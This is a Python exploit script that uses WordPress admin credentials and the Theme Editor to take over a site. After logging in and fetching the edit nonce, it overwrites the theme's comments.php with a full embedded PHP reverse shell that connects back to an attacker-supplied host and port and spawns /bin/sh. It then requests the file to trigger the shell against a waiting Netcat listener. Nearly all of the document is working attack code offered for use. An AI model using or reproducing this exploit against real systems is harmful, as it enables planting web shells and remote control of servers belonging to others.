import requests
import re
import sys
from colorama import init, Fore, Style

init()

banner = '''
 __    __              _   ___                     _____  __     __            _       _ _   
/ / /\ \ \___  _ __ __| | / _ \_ __ ___  ___ ___  /__   \/__\   /__\_  ___ __ | | ___ (_) |_ 
\ \/  \/ / _ \| '__/ _` |/ /_)/ '__/ _ \/ __/ __|   / /\/_\    /_\ \ \/ / '_ \| |/ _ \| | __|
 \  /\  / (_) | | | (_| / ___/| | |  __/\__ \__ \  / / //__   //__  >  <| |_) | | (_) | | |_ 
  \/  \/ \___/|_|  \__,_\/    |_|  \___||___/___/  \/  \__/   \__/ /_/\_\ .__/|_|\___/|_|\__|
                                                                        |_|                  
'''

print(banner)
print("This exploit uses the Theme Editor in WordPress to open a reverse shell.")
print("\n\nUsage:\npython3 wpte_exploit.py http://<IP>:<PORT>/ <USERNAME> <PASSWORD> <WORDPRESS_VERSION> <THEME_NAME> <LHOST> <LPORT>")
print("====================================================================================================================\n")

target_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
wp_version = sys.argv[4]
theme = sys.argv[5]
lhost = sys.argv[6]
lport = sys.argv[7]

php_reverse_code = '''<?php set_time_limit(0);$VERSION="1.0";$ip='{}';$port={};$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a;w;id;/bin/sh -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){{$pid=pcntl_fork();if($pid==-1){{printit("ERROR:Can'tfork");exit(1);}}if($pid){{exit(0);}}if(posix_setsid()==-1){{printit("Error:Can'tsetsid()");exit(1);}}$daemon=1;}}else{{printit("WARNING:Failedtodaemonise.Thisisquitecommonandnotfatal.");}}chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){{printit("$errstr($errno)");exit(1);}}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){{printit("ERROR:Can'tspawnshell");exit(1);}}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit("Successfullyopenedreverseshellto$ip:$port");while(1){{if(feof($sock)){{printit("ERROR:Shellconnectionterminated");break;}}if(feof($pipes[1])){{printit("ERROR:Shellprocessterminated");break;}}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){{if($debug)printit("SOCKREAD");$input=fread($sock,$chunk_size);if($debug)printit("SOCK:$input");fwrite($pipes[0],$input);}}if(in_array($pipes[1],$read_a)){{if($debug)printit("STDOUTREAD");$input=fread($pipes[1],$chunk_size);if($debug)printit("STDOUT:$input");fwrite($sock,$input);}}if(in_array($pipes[2],$read_a)){{if($debug)printit("STDERRREAD");$input=fread($pipes[2],$chunk_size);if($debug)printit("STDERR:$input");fwrite($sock,$input);}}}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){{if(!$daemon){{print"$string";}}}}?>'''.format(lhost,lport)
wp_version = wp_version[0]
theme = theme.lower()

s = requests.Session()
r = s.get(target_url + 'wp-login.php')

# log into WordPress Dashboard
data = {
    'log':username,
    'pwd':password,
    'wp-submit':'Log+In',
    'redirect_to':target_url+'wp-admin/',
    'testcookie':'1'
    }

print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Logging in with credentials:\n"  + Fore.YELLOW + "Username: " + Style.RESET_ALL + username + Fore.YELLOW +"\nPassword: " +Style.RESET_ALL + password + "\n")
r = s.post(target_url+'wp-login.php', data=data)
check_result = re.search('<div id="login_error">', r.text)

if check_result != None:
    print(Fore.RED + "[-] " + Style.RESET_ALL + "Authentication failed. Exiting now...")
    exit(0)
print(Fore.GREEN + "[+] " + Style.RESET_ALL + "Successfully authenticated!\n")

# Check whether Theme Editor is enabled
print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Checking whether Theme Editor is enabled...")
r = s.get(target_url+'wp-admin/theme-editor.php/')

if r.status_code != 200:
    print(Fore.RED + "[-] " + Style.RESET_ALL + "Theme Editor is not enabled on this WordPress page. Exiting now...")
    exit(0)
print(Fore.GREEN + "[+] " + Style.RESET_ALL + "Theme Editor is enabled.\n")


# Obtain nonce for comments.php file (steps differs depending on version of WordPress)
if wp_version == '5':
    r = s.get(target_url+f'wp-admin/theme-editor.php?file=comments.php&theme={theme}')
    print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Obtaining WP nonce for file update...")
    nonce = re.findall(r'<input type="hidden" id="nonce" name="nonce" value="(\w+)"', r.text)

    if len(nonce) == 0 :
        print(Fore.RED + "[-] " + Style.RESET_ALL + "Failed to retrieve the WP nonce. Exiting now... \n")
        exit(0)
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + "WP nonce retrieved successfully ! nonce : " + nonce[0] +"\n")

else:
    r = s.get(target_url+f'wp-admin/theme-editor.php?file=comments.php&theme={theme}')
    print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Obtaining _wpnonce for file update...")
    nonce = re.findall(r'<input type="hidden" id="_wpnonce" name="_wpnonce" value="(\w+)"', r.text)

    if len(nonce) == 0 :
        print(Fore.RED + "[-] " + Style.RESET_ALL + "Failed to retrieve the WP nonce. Exiting now... \n")
        exit(0)
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + "_wpnonce retrieved successfully ! _wpnonce : " + nonce[0] +"\n")


# Update comments.php file (steps differs depending on version of WordPress)
print(Fore.YELLOW + "[*] " + Style.RESET_ALL + "Updating comments.php file with reverse shell script...")

if wp_version == '5':
    data = {
        'nonce':nonce[0],
        '_wp_http_referer': f'/wp-admin/theme-editor.php?file=comments.php&theme={theme}',
        'newcontent': php_reverse_code,
        'action': 'edit-theme-plugin-file',
        'file': 'comments.php',
        'theme': theme,
        'docs-list': ''
        }

    r = s.post(target_url+'wp-admin/admin-ajax.php', data=data)
    check_result = re.search('true', r.text)
    if check_result == None:
        print(Fore.RED + "[-] " + Style.RESET_ALL + 'Failed to update comments.php file. Exiting now...')
        exit(0)
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + 'Successfully updated comments.php file.\n')

else:
    data = {
        '_wpnonce':nonce[0],
        '_wp_http_referer': f'/wp-admin/theme-editor.php?file=comments.php&theme={theme}',
        'newcontent': php_reverse_code,
        'action': 'update',
        'file': 'comments.php',
        'theme': theme,
        'scrollto': '1',
        'docs-list': '',
        'submit': 'Update+File'
        }

    r = s.post(target_url+'wp-admin/theme-editor.php', data=data)
    check_result = re.search('true', r.text)
    if check_result == None:
        print(Fore.RED + "[-] " + Style.RESET_ALL + 'Failed to update comments.php file. Exiting now...')
        exit(0)
    print(Fore.GREEN + "[+] " + Style.RESET_ALL + 'Successfully updated comments.php file.\n')

input('Have you set up a Netcat listener? (Press Enter to continue)')

# Call comments.php file
print(Fore.GREEN + "\n[+] " + Style.RESET_ALL + 'Opening reverse shell...\n')
try:
    r = s.get(target_url+f'wp-content/themes/{theme}/comments.php', timeout=1)
except:
    pass